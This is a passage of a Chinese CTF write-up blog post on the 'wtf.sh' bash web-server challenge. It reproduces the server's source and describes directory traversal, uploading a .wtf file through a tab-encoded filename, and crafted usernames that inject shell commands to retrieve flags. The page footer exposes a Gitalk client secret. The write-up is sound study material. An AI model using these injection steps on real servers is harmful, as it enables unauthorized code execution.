&gt;&gt; .index_cache.html # add post to users' post cache local hashed=$(hash_username "$&#123;username&#125;"); echo "$&#123;post_id&#125;/1" &gt;&gt; "users_lookup/$&#123;hashed&#125;/posts"; echo $&#123;post_id&#125;; &#125; function reply &#123; local post_id=$1; local username=$2; local text=$3; local hashed=$(hash_username "$&#123;username&#125;"); curr_id=$(for d in posts/$&#123;post_id&#125;/*; do basename $d; done | sort -n | tail -n 1); next_reply_id=$(awk '&#123;print $1+1&#125;' &lt;&lt;&lt; "$&#123;curr_id&#125;"); next_file=(posts/$&#123;post_id&#125;/$&#123;next_reply_id&#125;); echo "$&#123;username&#125;" &gt; "$&#123;next_file&#125;"; echo "RE: $(nth_line 2 &lt; "posts/$&#123;post_id&#125;/1")" &gt;&gt; "$&#123;next_file&#125;"; echo "$&#123;text&#125;" &gt;&gt; "$&#123;next_file&#125;"; # add post this is in reply to to posts cache echo "$&#123;post_id&#125;/$&#123;next_reply_id&#125;" &gt;&gt; "users_lookup/$&#123;hashed&#125;/posts"; &#125;</span></span><br></pre></td></tr></table></figure></div>
<p>(9)这是flag1的线索</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> user_functions.sh &lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="keyword">if</span> contains <span class="string">'user'</span> <span class="variable">$&#123;!URL_PARAMS[@]&#125;</span> &amp;&amp; file_exists <span class="string">"users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>"</span> $ <span class="keyword">then</span> $ <span class="built_in">local</span> username=$(head -n 1 users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>); $ <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;<span class="variable">$&#123;username&#125;</span>'s posts:&lt;/h3&gt;"</span>; $ <span class="built_in">echo</span> <span class="string">"&lt;ol&gt;"</span>; $ get_users_posts <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span> | <span class="keyword">while</span> <span class="built_in">read</span> -r post; <span class="keyword">do</span> $ post_slug=$(awk -F/ <span class="string">'&#123;print $2 "#" $3&#125;'</span> &lt;&lt;&lt; <span class="string">"<span class="variable">$&#123;post&#125;</span>"</span>); $ <span class="built_in">echo</span> <span class="string">"&lt;li&gt;&lt;a href=\"/post.wtf?post=<span class="variable">$&#123;post_slug&#125;</span>\"&gt;<span class="variable">$(nth_line 2 "$&#123;post&#125;" | htmlentities)</span>&lt;/a&gt;&lt;/li&gt;"</span>; $ <span class="keyword">done</span> $ <span class="built_in">echo</span> <span class="string">"&lt;/ol&gt;"</span>; $ <span class="keyword">if</span> is_logged_in &amp;&amp; [[ <span class="string">"<span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>"</span> = <span class="string">'admin'</span> ]] &amp;&amp; [[ <span class="variable">$&#123;username&#125;</span> = <span class="string">'admin'</span> ]] $ <span class="keyword">then</span> $ get_flag1 $ <span class="keyword">fi</span> $ <span class="keyword">fi</span> &lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>(10)回复帖子</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="built_in">source</span> user_functions.sh $ <span class="built_in">source</span> post_functions.sh $ <span class="keyword">if</span> [[ <span class="variable">$method</span> = <span class="string">'POST'</span> ]] $ <span class="keyword">then</span> $ <span class="keyword">if</span> is_logged_in $ <span class="keyword">then</span> $ <span class="keyword">if</span> [[ <span class="variable">$&#123;POST_PARAMS['text']&#125;</span> != <span class="string">''</span> &amp;&amp; <span class="variable">$&#123;URL_PARAMS['post']&#125;</span> != <span class="string">''</span> ]] $ <span class="keyword">then</span> $ reply <span class="string">"<span class="variable">$&#123;URL_PARAMS['post']&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;POST_PARAMS['text']&#125;</span>"</span> $ redirect <span class="string">"/post.wtf?post=<span class="variable">$&#123;URL_PARAMS['post']&#125;</span>#<span class="variable">$&#123;next_post_id&#125;</span>"</span>; $ <span class="keyword">else</span> $ redirect <span class="string">"/reply.wtf?post=<span class="variable">$&#123;URL_PARAMS['post']&#125;</span>"</span>; $ <span class="keyword">fi</span> $ <span class="keyword">else</span> $ redirect <span class="string">"/login.wtf"</span> $ <span class="keyword">fi</span> $ <span class="keyword">fi</span> $ <span class="keyword">if</span> [[ <span class="variable">$&#123;URL_PARAMS['post']&#125;</span> = <span class="string">''</span> ]] $ <span class="keyword">then</span> $ <span class="built_in">echo</span> <span class="string">"u need to be replying to a post, you dumdum"</span>; $ <span class="keyword">fi</span> $ <span class="keyword">if</span> is_logged_in $ <span class="keyword">then</span> $ <span class="built_in">echo</span> <span class="string">"u r logged in, s0 gib reply"</span> $ <span class="keyword">else</span> $ redirect <span class="string">"/login.wtf"</span> $ <span class="keyword">fi</span> &lt;form method=POST&gt; &lt;textarea name=text placeholder=<span class="string">"Reply Text"</span>&gt;&lt;/textarea&gt;&lt;br&gt; &lt;button <span class="built_in">type</span>=submit name=submit&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>(11)控制权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -R /opt/wtf.sh /tmp/wtf_runtime; <span class="comment"># protect our stuff chmod -R 555 /tmp/wtf_runtime/wtf.sh/*.wtf; chmod -R 555 /tmp/wtf_runtime/wtf.sh/*.sh; chmod 777 /tmp/wtf_runtime/wtf.sh/; # set all dirs we could want to write into to be owned by www # (We don't do whole webroot since we want the people to be able to create # files in webroot, but not overwrite existing files) chmod -R 777 /tmp/wtf_runtime/wtf.sh/posts/; chown -R www:www /tmp/wtf_runtime/wtf.sh/posts/; chmod -R 777 /tmp/wtf_runtime/wtf.sh/users/; chown -R www:www /tmp/wtf_runtime/wtf.sh/users/; chmod -R 777 /tmp/wtf_runtime/wtf.sh/users_lookup/; chown -R www:www /tmp/wtf_runtime/wtf.sh/users_lookup/; # let's get this party started! su www -c "/tmp/wtf_runtime/wtf.sh/wtf.sh 8000";</span></span><br></pre></td></tr></table></figure></div>

<p>(12)这里应该是对 用户名之类的进行了加密处理</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> hash_password &#123; <span class="built_in">local</span> password=<span class="variable">$1</span>; (shasum &lt;&lt;&lt; <span class="variable">$&#123;password&#125;</span>) | cut -d\ -f1; &#125; <span class="comment"># hash usernames for lookup in the users_lookup table function hash_username &#123; local username=$1; (shasum &lt;&lt;&lt; $&#123;username&#125;) | cut -d\ -f1; &#125; # generate a random token, base64 encoded # on GNU base64 wraps at 76 characters, so we need to pass --wrap=0 function generate_token &#123; (head -c 64 | (base64 --wrap=0 || base64)) &lt; /dev/urandom 2&gt; /dev/null; &#125; function find_user_file &#123; local username=$1; local hashed=$(hash_username "$&#123;username&#125;"); local f; if [[ -n "$&#123;username&#125;" &amp;&amp; -e "users_lookup/$&#123;hashed&#125;" ]] then echo "users/$(cat "users_lookup/$&#123;hashed&#125;/userid")"; else echo "NONE"; # our failure case -- ugly but w/e... fi; return; &#125; # The caller is responsible for checking that the user doesn't exist already calling this function create_user &#123; local username=$1; local password=$2; local hashed_pass=$(hash_password $&#123;password&#125;); local hashed_username=$(hash_username "$&#123;username&#125;"); local token=$(generate_token); mkdir users 2&gt; /dev/null; # make sure users directory exists touch users/.nolist; # make sure that the users dir can't be listed touch users/.noread; # don't allow reading of user files directly mkdir users_lookup 2&gt; /dev/null; # make sure the username -&gt; userid lookup directory exists touch users_lookup/.nolist; # don't let it be listed local user_id=$(basename $(mktemp users/XXXXX)); # user files look like: # username # hashed_pass # token echo "$&#123;username&#125;" &gt; "users/$&#123;user_id&#125;"; echo "$&#123;hashed_pass&#125;" &gt;&gt; "users/$&#123;user_id&#125;"; echo "$&#123;token&#125;" &gt;&gt; "users/$&#123;user_id&#125;"; mkdir "users_lookup/$&#123;hashed_username&#125;" 2&gt; /dev/null; touch "users_lookup/$&#123;hashed_username&#125;/.nolist"; # lookup dir for this user can't be readable touch "users_lookup/$&#123;hashed_username&#125;/.noread"; # don't allow reading the lookup dir touch "users_lookup/$&#123;hashed_username&#125;/posts"; # lookup for posts this user has participated in echo "$&#123;user_id&#125;" &gt; "users_lookup/$&#123;hashed_username&#125;/userid"; # create reverse lookup echo $&#123;user_id&#125;; &#125; function check_password &#123; local username=$1; local password=$2; local userfile=$(find_user_file $&#123;username&#125;); if [[ $&#123;userfile&#125; = 'NONE' ]] then return 1; fi local hashed_pass=$(hash_password $&#123;password&#125;); local correct_hash=$(head -n2 $&#123;userfile&#125; | tail -n1); [[ $&#123;hashed_pass&#125; = $&#123;correct_hash&#125; ]]; return $?; &#125; function is_logged_in &#123; contains 'TOKEN' $&#123;!COOKIES[@]&#125; &amp;&amp; contains 'USERNAME' $&#123;!COOKIES[@]&#125;; local has_cookies=$? local userfile=$(find_user_file $&#123;COOKIES['USERNAME']&#125;); [[ $&#123;has_cookies&#125; \ &amp;&amp; $&#123;userfile&#125; != 'NONE' \ &amp;&amp; $(tail -n1 $&#123;userfile&#125; 2&gt;/dev/null) = $&#123;COOKIES['TOKEN']&#125; \ &amp;&amp; $(head -n1 $&#123;userfile&#125; 2&gt;/dev/null) = $&#123;COOKIES['USERNAME']&#125; \ ]]; return $?; &#125; function get_users_posts &#123; local username=$1; local hashed=$(hash_username "$&#123;username&#125;"); # we only have to iterate over posts a user has replied to while read -r post_id; do echo "posts/$&#123;post_id&#125;"; done &lt; "users_lookup/$&#123;hashed&#125;/posts"; &#125;</span></span><br></pre></td></tr></table></figure></div>
<p>(13)这里的一部分代码暴露了可以进行上传，处理并且管理reply的代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config stuff PROCESS_LIMIT=512 # per connection PROFILE=false # shell options shopt -s extglob; # ~~ PROFILING ~~ if [[ $PROFILE = true ]] then PS4='+ $(date "+%s.%N") $(if [[ $&#123;FUNCNAME&#125; = "" ]]; then echo NONE; else echo "$&#123;FUNCNAME&#125;"; fi ) $&#123;LINENO&#125;\011 ' exec 3&gt;&amp;2 2&gt;/tmp/bashprof.$$.log set -x fi # sick facts about bash declare -a BASH_FACTS=( $'Bash has an `until` keyword, which is equivalent to `while not`.' $'Single and Double quotes do different things in bash -- single quotes do not interpolate variables, while double quotes do.' $'When globbing on arrays in bash, you have the option to use [*] and [@], which appear to both return all the elements of the array. However, [*] acts like a "splat operator", while [@] keeps all everything constrained to the same argument.' $'The bash array access syntax looks like $&#123;array[$idx]&#125;.' $'If you forget the brackets in an array access, bash will just return the first element of the array.' $'Bash didn\'t have Associative Arrays until Bash 4' $'The idomatic way of iterating over all the lines in a file in bash is `while read -r line; do &lt;something with line&gt;; done &lt; &lt;filename&gt;`' $'Loops are just commands. So, you can pipe things into and out of them!' ); source lib.sh # import stdlib VERSION="0.0.0.0.1 \"alphaest of bets\"" declare -a REPLY_HEADERS=( "X-Powered-By: wtf.sh $&#123;VERSION&#125;" # Fly the banner of wtf.sh proudly! "X-Bash-Fact: $(shuf --head-count=1 -e "$&#123;BASH_FACTS[@]&#125;")" # select a random BASH FACT to include ); declare -A URL_PARAMS # hashtable of url parameters declare -A POST_PARAMS # hashtable of post parameters declare -A HTTP_HEADERS # hashtable of http headers declare -A COOKIES # hashtable of cookies function log &#123; echo "[`date`] $@" 1&gt;&amp;9 &#125; urldecode() &#123; # urldecode &lt;string&gt; local url_encoded="$&#123;1//+/ &#125;" printf '%b' "$&#123;url_encoded//%/\\x&#125;" &#125; max_page_include_depth=64 page_include_depth=0 function include_page &#123; # include_page &lt;pathname&gt; local pathname=$1 local cmd="" [[ "$&#123;pathname:(-4)&#125;" = '.wtf' ]]; local can_execute=$?; page_include_depth=$(($page_include_depth+1)) if [[ $page_include_depth -lt $max_page_include_depth ]] then local line; while read -r line; do # check if we're in a script line or not ($ at the beginning implies script line) # also, our extension needs to be .wtf [[ "$" = "$&#123;line:0:1&#125;" &amp;&amp; $&#123;can_execute&#125; = 0 ]]; is_script=$?; # execute the line. if [[ $is_script = 0 ]] then cmd+=$'\n'"$&#123;line#"$"&#125;"; else if [[ -n $cmd ]] then eval "$cmd" || log "Error during execution of $&#123;cmd&#125;"; cmd="" fi echo $line fi done &lt; $&#123;pathname&#125; else echo "&lt;p&gt;Max include depth exceeded!&lt;p&gt;" fi &#125; function parse_headers &#123; while read -r line; do if [[ $line = $'\r' || $line == $'\n' ]] then break else a=($line) key=$&#123;a[0]%?&#125; value=$&#123;a[@]:1&#125; HTTP_HEADERS[$key]=$&#123;value:0:-1&#125;; # remove \r from end fi done &#125; function parse_cookies &#123; while read -d ';' -r cookie; do local key=$(cut -d\= -f1 &lt;&lt;&lt; "$&#123;cookie&#125;"); local value=$&#123;cookie#*=&#125;; COOKIES[$&#123;key&#125;]=$&#123;value&#125;; done &lt;&lt;&lt; "$&#123;HTTP_HEADERS['Cookie']&#125;;" # append a ; so we still get the last field -- read drops the last thing &gt;_&lt; &#125; function handle_connection &#123; ulimit -u "$&#123;PROCESS_LIMIT&#125;"; # limit num processes per connection # Parse query and any url parameters that may be in the path IFS=' ' read -r method path version # fast fail on empty request if [[ $&#123;method&#125; = '' ]] then return fi query=$&#123;path##*\?&#125;; if [[ $query != $path ]] then while read -d '&amp;' -r param; do IFS='=' read key value &lt;&lt;&lt; $&#123;param&#125;; URL_PARAMS[$key]=$(urldecode $value) done &lt;&lt;&lt; "$&#123;query&#125;&amp;" # add &amp; so last argument is seen fi request=("$method" "$path" "$version") path=$(urldecode $(cut -d\? -f1 &lt;&lt;&lt; "$&#123;path&#125;")) # strip url parameters, urldecode # parse headers parse_headers; # parse out cookie values, if they exist if contains "Cookie" "$&#123;!HTTP_HEADERS[@]&#125;" then parse_cookies; fi if [[ $method == "POST" ]] then # <span class="doctag">TODO:</span> handle multipart bodies local line; local n; n=$&#123;HTTP_HEADERS['Content-Length']&#125;; read -n$n -r line; params=($(sed "s/\&amp;/ /g" &lt;&lt;&lt; "$&#123;line&#125;")) for param in $&#123;params[@]&#125;; do IFS='=' read key value &lt;&lt;&lt; $&#123;param&#125;; POST_PARAMS[$key]=$(urldecode $value) done fi # if we know the IP (via an X-Forwarded-For header), stick the user in a sandbox # (Cloudflare will fill in this IP in prod, we can also have nginx fill it in in dev if we want) if contains "X-Forwarded-For" "$&#123;!HTTP_HEADERS[@]&#125;" then sandbox_dir="$((cksum &lt;&lt;&lt; $&#123;HTTP_HEADERS["X-Forwarded-For"]&#125;) | cut -d\ -f1).sandbox"; # create sandbox if it doesn't exist if [[ ! -e "$&#123;sandbox_dir&#125;" ]] then mkdir "$&#123;sandbox_dir&#125;"; # copy anything that isn't itself a sandbox to the dir cp -R !(*.sandbox) "$&#123;sandbox_dir&#125;"; fi cd "$&#123;sandbox_dir&#125;"; else log "WARNING: Not sandboxing: no X-Forwarded-For header found!" fi requested_path=$(pwd)/$&#123;path&#125; # if a directory is requested, try each of the following, in order # index.wtf, index.html local index_fills=("index.wtf" "index.html"); if [[ -d $&#123;requested_path&#125; ]] then for i in $&#123;index_fills&#125;; do if [[ -e "$&#123;requested_path&#125;/$&#123;i&#125;" ]] then requested_path="$&#123;requested_path&#125;/$&#123;i&#125;"; break; fi done fi # check for possible directory traversals / other undesirable path elements by # removing them and 503-ing if the string was changed test_path=$(sed "s/\.\.//g" &lt;&lt;&lt; "$&#123;requested_path&#125;") if [[ $&#123;test_path&#125; != $&#123;requested_path&#125; ]] then echo "HTTP/1.1 503 Forbidden" echo "Content-Type: text/html" for reply_header in "$&#123;REPLY_HEADERS[@]&#125;"; do echo "$&#123;reply_header&#125;" done printf "\r\n\r\n" echo "&lt;html&gt;&lt;title&gt;503&lt;/title&gt;&lt;body&gt;503 Forbidden&lt;/body&gt;&lt;/html&gt;" echo "&lt;p&gt;Sorry, directory traversal is strongly frowned upon here at wtf.sh enterprises&lt;/p&gt;"; log "503: $&#123;request[@]&#125;" exit 0; # terminate early for 503 fi [[ ! -e "$&#123;requested_path&#125;/.nolist" ]]; local can_list=$?; [[ ! -e "$(dirname "$&#123;requested_path&#125;")/.noread" ]]; local can_read=$?; if [[ -e $&#123;requested_path&#125; ]] then if [[ -f $&#123;requested_path&#125; \ &amp;&amp; $&#123;requested_path:(-4)&#125; != ".log"\ &amp;&amp; $&#123;can_read&#125; = 0 ]] # can't end in .log, can't have .noread in the parent directory then echo "HTTP/1.1 200 OK" echo "Content-Type: text/html" for reply_header in "$&#123;REPLY_HEADERS[@]&#125;"; do echo "$&#123;reply_header&#125;" done printf "\r\n\r\n" include_page $&#123;requested_path&#125;; elif [[ -d $&#123;requested_path&#125; \ &amp;&amp; $&#123;can_list&#125; = 0 ]] # handle directory listing if it isn't a file and no `.nolist` file in the directory then log "$(dirname "$&#123;requested_path&#125;")/.noread" echo "HTTP/1.1 200 OK" echo "Content-Type: text/html" for reply_header in "$&#123;REPLY_HEADERS[@]&#125;"; do echo "$&#123;reply_header&#125;" done printf "\r\n\r\n" echo "&lt;h3&gt;Index of $&#123;request[1]&#125;&lt;/h3&gt;" echo "&lt;ul&gt;" for d in $&#123;requested_path&#125;/*; do size_info=($(du -h $&#123;requested_path&#125; | tail -n 1)) echo "&lt;li&gt;&lt;a href="/$&#123;request[1]#"/"&#125;$&#123;d&#125;"&gt;$&#123;d&#125;&lt;/a&gt;: $&#123;size_info[0]&#125;&lt;/li&gt;" done echo "&lt;/ul&gt;" echo "&lt;font size=2&gt;generated by wtf.sh $&#123;VERSION&#125; on $(date)&lt;/font&gt;" else echo "HTTP/1.1 503 Forbidden" echo "Content-Type: text/html" for reply_header in "$&#123;REPLY_HEADERS[@]&#125;"; do echo "$&#123;reply_header&#125;" done printf "\r\n\r\n" echo "&lt;title&gt;503 Forbidden&lt;/title&gt;"; echo "&lt;h3&gt;I'm sorry, I'm afraid I can't let you see that&lt;/h3&gt;"; echo "&lt;p&gt;It seems that you tried to list a directory with a &lt;code&gt;.nolist&lt;/code&gt; file in it, or a &lt;code&gt;.noread&lt;/code&gt; file in it's parent, or a forbidden file type.&lt;/p&gt;"; echo "&lt;p&gt;If you think this was a mistake, I feel bad for you, son. I got 99 problems, but a 503 ain't one.&lt;/p&gt;"; log "503: $&#123;request[@]&#125;" exit 0; fi log "200: $&#123;request[@]&#125;" exit 0 else # If we were noread or nolist, send a 503, even though the resource doesn't even exist -- we don't want to leak what forbidden resources do and do not exist if [[ $&#123;can_read&#125; = 1 || $&#123;can_list&#125; = 1 ]]; then echo "HTTP/1.1 503 Not Found"; echo "Content-Type: text/html" for reply_header in "$&#123;REPLY_HEADERS[@]&#125;"; do echo "$&#123;reply_header&#125;" done printf "\r\n\r\n" echo "&lt;title&gt;503 Forbidden&lt;/title&gt;"; echo "&lt;h3&gt;I'm sorry, I'm afraid I can't let you see that&lt;/h3&gt;"; echo "&lt;p&gt;It seems that you tried to list a directory with a &lt;code&gt;.nolist&lt;/code&gt; file in it, or a &lt;code&gt;.noread&lt;/code&gt; file in it's parent, or a forbidden file type.&lt;/p&gt;"; echo "&lt;p&gt;If you think this was a mistake, I feel bad for you, son. I got 99 problems, but a 503 ain't one.&lt;/p&gt;"; log "503: $&#123;request[@]&#125;" else echo "HTTP/1.1 404 Not Found" echo "Content-Type: text/html" for reply_header in "$&#123;REPLY_HEADERS[@]&#125;"; do echo "$&#123;reply_header&#125;" done printf "\r\n\r\n" echo "&lt;html&gt;&lt;title&gt;404&lt;/title&gt;&lt;body&gt;404, not found:&lt;code&gt;$&#123;request[1]&#125;&lt;/code&gt;&lt;/body&gt;&lt;/html&gt;" log "404: $&#123;request[@]&#125;" fi exit 0 fi &#125; # start socat on specified port function start_server &#123; echo "wtf.sh $&#123;VERSION&#125;, starting!"; socat -T10 TCP-LISTEN:$2,fork,readbytes=4096,backlog=256,reuseaddr EXEC:"$1 -r" 9&gt;&amp;1 echo "Socket was occupied... try again later..."; &#125; if [[ $# != 1 ]] then echo "Usage: $0 port" exit fi if [[ $1 == '-r' ]] then handle_connection else start_server $0 $1 # start server on specified port fi</span></span><br></pre></td></tr></table></figure></div>
<p>提取：这段源码应该是在说<br> ①.导入文件，判断文件是否为.wtf<br> ②.当文件为.wtf且page_include_depth&lt;max_page_include_depth，则逐行读取文件<br> ③.当读取到开头为 $ 的可读取文件时，读取该文件并通过log函数记录日志</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">max_page_include_depth=64 </span><br><span class="line">page_include_depth=0 </span><br><span class="line"><span class="keyword">function</span> include_page &#123; </span><br><span class="line">	<span class="comment"># include_page &lt;pathname&gt; </span></span><br><span class="line">	<span class="built_in">local</span> pathname=<span class="variable">$1</span> </span><br><span class="line">	<span class="built_in">local</span> cmd=<span class="string">""</span> [[ <span class="string">"<span class="variable">$&#123;pathname:(-4)&#125;</span>"</span> = <span class="string">'.wtf'</span> ]]; </span><br><span class="line">	<span class="built_in">local</span> can_execute=$?; </span><br><span class="line">	page_include_depth=$((<span class="variable">$page_include_depth</span>+1)) </span><br><span class="line">	<span class="keyword">if</span> [[ <span class="variable">$page_include_depth</span> -lt <span class="variable">$max_page_include_depth</span> ]] </span><br><span class="line">t		hen <span class="built_in">local</span> line; </span><br><span class="line">	<span class="keyword">while</span> <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># check if we're in a script line or not ($ at the beginning implies script line) </span></span><br><span class="line">	<span class="comment"># also, our extension needs to be .wtf [[ "$" = "$&#123;line:0:1&#125;" &amp;&amp; $&#123;can_execute&#125; = 0 ]]; </span></span><br><span class="line">		is_script=$?; </span><br><span class="line">	<span class="comment"># execute the line. </span></span><br><span class="line">	<span class="keyword">if</span> [[ <span class="variable">$is_script</span> = 0 ]] </span><br><span class="line">	<span class="keyword">then</span> </span><br><span class="line">		cmd+=$<span class="string">'\n'</span><span class="string">"<span class="variable">$&#123;line#"$"&#125;</span>"</span>; </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> [[ -n <span class="variable">$cmd</span> ]] <span class="keyword">then</span> <span class="built_in">eval</span> <span class="string">"<span class="variable">$cmd</span>"</span> || <span class="built_in">log</span> <span class="string">"Error during execution of <span class="variable">$&#123;cmd&#125;</span>"</span>; </span><br><span class="line">	cmd=<span class="string">""</span> <span class="keyword">fi</span> <span class="built_in">echo</span> <span class="variable">$line</span> <span class="keyword">fi</span> <span class="keyword">done</span> &lt; <span class="variable">$&#123;pathname&#125;</span> </span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Max include depth exceeded!&lt;p&gt;"</span> </span><br><span class="line"><span class="keyword">fi</span> &#125;</span><br></pre></td></tr></table></figure></div>
<p>从(8)和(10)里找到reply函数的线索：根据发帖栏会将用户名一起写入。在(13)里找到reply函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> reply &#123; </span><br><span class="line">	<span class="built_in">local</span> post_id=<span class="variable">$1</span>; </span><br><span class="line">	<span class="built_in">local</span> username=<span class="variable">$2</span>; </span><br><span class="line">	<span class="built_in">local</span> text=<span class="variable">$3</span>; </span><br><span class="line">	<span class="built_in">local</span> hashed=$(hash_username <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span>); </span><br><span class="line">	curr_id=$(<span class="keyword">for</span> d <span class="keyword">in</span> posts/<span class="variable">$&#123;post_id&#125;</span>/*; <span class="keyword">do</span> </span><br><span class="line">		basename <span class="variable">$d</span>; </span><br><span class="line">	<span class="keyword">done</span> | sort -n | tail -n 1); </span><br><span class="line">	next_reply_id=$(awk <span class="string">'&#123;print $1+1&#125;'</span> &lt;&lt;&lt; <span class="string">"<span class="variable">$&#123;curr_id&#125;</span>"</span>); </span><br><span class="line">	next_file=(posts/<span class="variable">$&#123;post_id&#125;</span>/<span class="variable">$&#123;next_reply_id&#125;</span>); </span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span> &gt; <span class="string">"<span class="variable">$&#123;next_file&#125;</span>"</span>; </span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"RE: <span class="variable">$(nth_line 2 &lt; "posts/$&#123;post_id&#125;/1")</span>"</span> &gt;&gt; <span class="string">"<span class="variable">$&#123;next_file&#125;</span>"</span>; </span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;text&#125;</span>"</span> &gt;&gt; <span class="string">"<span class="variable">$&#123;next_file&#125;</span>"</span>; </span><br><span class="line">	<span class="comment"># add post this is in reply to to posts cache echo </span></span><br><span class="line">	<span class="string">"<span class="variable">$&#123;post_id&#125;</span>/<span class="variable">$&#123;next_reply_id&#125;</span>"</span> &gt;&gt; <span class="string">"users_lookup/<span class="variable">$&#123;hashed&#125;</span>/posts"</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>6.进行穿越测试,成功进入后门，这里为什么用的reply.wtf而不是creat_post.wtf，因为creat_post限制了文件上传的目录，可能会受到函数限制<br>并且(10)后面有一句 #${next_post_id} 使得你无法生成wtf文件，所以在.wtf后面添加制表符，对应url编码%09<br><img src="6.PNG" alt=""><br><img src="7.PNG" alt=""></p>
<p>7.因为前面获得一个函数 get_flag1 ，所以在这里搜索get_flag2，构建用户名：<br>并上传wtf文件,登陆查看路径</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$find</span>&#123;find,/,-iname,get_flag2&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="8.PNG" alt=""><br><img src="9.PNG" alt=""></p>
<p>8.所以我们构造用户名：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$/usr/bin/get_flag2</span><br></pre></td></tr></table></figure></div>
<p><img src="10.PNG" alt=""></p>
<p>9.登陆后门，查看 即可获得flag2<br><img src="11.PNG" alt=""></p>
<div class="note info"><p>0x03 参考</p></div>
1.<a href="https://blog.csdn.net/harry_c/article/details/100748217" target="_blank" >csdn参考:https://blog.csdn.net/harry_c/article/details/100748217</a><br>
2.<a href="https://v0w.top/2018/08/13/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" target="_blank">目录穿越介绍</a><br>


<br>
<br>

<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
